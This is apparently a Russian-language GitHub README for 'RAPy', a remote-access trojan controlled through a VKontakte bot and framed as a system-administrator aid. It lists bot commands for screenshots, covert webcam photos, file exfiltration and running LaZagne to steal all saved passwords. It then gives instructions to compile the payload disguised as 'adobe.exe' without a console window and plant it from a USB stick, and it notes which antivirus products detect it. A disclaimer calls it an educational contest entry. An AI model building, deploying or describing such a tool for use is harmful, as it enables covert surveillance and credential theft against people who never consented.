Автор кода никак не связан с распространением данной программы
Использовать на свой страх и риск, помните, что в этом мире все наказуемо
Каждое действие несет последствия
Автор кода всего лишь написал учебную программу для конкурса(диплом победителя прилагается по требованию) и никаких других умыслов не преследовал
=======


 RAPy - помощь сис.админу
=============================

<p align="center">
  <img src="https://sun9-12.userapi.com/impg/EqTtrZa4_56XCJZLQIiF03rQwQlHvmVRmfZsnw/x7BNa_5xRd4.jpg?size=1280x905&quality=96&proxy=1&sign=b470093901d51e89e0dd6b7610243fe9" alt="Sublime's custom image"/>
</p>

Известные проблемы
------------
Перестал работать anonfiles.com без VPN подключения. Проект заморожен, спользовать только в целях архивного кода и просмотра его реализации.

Что это?
------------
Это инструмент для упрощения работы системного администратора.
С помощью него можно управлять удаленными компьютерами через социальную сеть «Вконтакте».
В этой программе есть несколько функций. Для их активации нужно написать боту следующее:

    Скрин        - отправит скриншот экрана комьютера
    Вебка        - отправит фотографию с веб-камеры
    ip           - отправит внешний ip-адрес компьютера
    локаль       - отправит внутренний ip-адрес компьютера
    shutdown /s  - выключит компьютер 
    shutdown /r  - перезапустит компьютер
    Скачать file.txt - скачает файл и именем file.txt > скачивает до 20 ГБ любые форматы 
    взломать пароли  - скачивает утилиту LaZagne и запускает с ключами all -quiet -oJ (взлом всех паролей на компьютере)
    скачать пароли   - находит последний файл паролей json и отправляет текстом вк 

УСТАНОВКА
------------
Зависимости:

    Python 3.7 (выше или ниже версия не проверялась на работоспособность)
    Библиотеки requirements.txt

Введите в терминале
```bash
https://github.com/LencoDigitexer/RAPy.git
cd RAPy
pip3.7 install -r requirements.txt
```
Отредактируйте файл tok.py
```python
token = "токен группы"
id_id = id группы
admin = id беседы или человека для оповещения при старте программы
```
Ключ должен соответствовать требованиям:
1. Ключи доступа - создать ключ - Разрешить приложению доступ к управлению сообществом - Разрешить приложению доступ к сообщениям сообщества - Разрешить приложению доступ к фотографиям сообщества - Разрешить приложению доступ к документам сообщества
2. Long Poll API: Включено 
3. Версия API: 5.58
4. Типы событий - Все сообщения, все фотографии

ЗАПУСК
------------
Введите в терминале
```bash 
python3.7 adobe.py
```
Находясь в корневой папке RAPy

Компиляция
------------
Введите в терминале
```bash 
pip3.7 install pyinstaller
pyinstaller --onefile --icon=adobe.ico --noconsole adobe.py
pyinstaller copys.py
```
Находясь в корневой папке RAPy

Аудит
------------
В корень флешки скопировать два файла: copys.exe adobe.exe
На всякий случай создать папку с копиями на случай, если вирус заподозрит угрозу.
Вставить флешку в копьютер с операционной системой windows( vista и новее).
Открыть флешку и запустить файл copys.py.
Подождать 5-8 секунд и вытащить флешку.
Перезагрузить ПК.

Антивирусы
------------
Файл **copys.exe** - [VirusTotal](https://www.virustotal.com/gui/file/46e9181ffc67afa287dfcfd06eac847929bfa2687e37952211dd90970391613f/detection)
Обнаруживается такими антивирусами как AVG и физическим антивирусом от McAfee. Остальное - зарубежные антивирусы, которыми в России не пользуются.

Файл **adobe.exe** - [VirusTotal](https://www.virustotal.com/gui/file/7dd49fdc07c1eaa048c3cba3a1253fd9780ceab572e92717b53907edf4702461/detection)
Для почти всех антивирусов не является вирусом
